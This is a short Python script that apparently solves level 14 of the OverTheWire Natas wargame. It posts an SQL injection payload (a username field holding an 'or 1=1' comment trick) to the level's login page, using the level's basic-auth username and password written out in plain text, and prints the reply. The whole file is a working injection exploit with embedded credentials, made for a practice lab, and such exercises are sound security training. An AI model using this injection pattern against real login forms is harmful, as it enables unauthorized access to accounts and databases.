import requests
data = {"username":" \" or 1=1 # \" ","password":"0xdeadbeef"}
url="http://natas14.natas.labs.overthewire.org/"
exploit=requests.session();
exploit.auth=("natas14","Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1")
data=exploit.post(url,data=data)
print(data.text)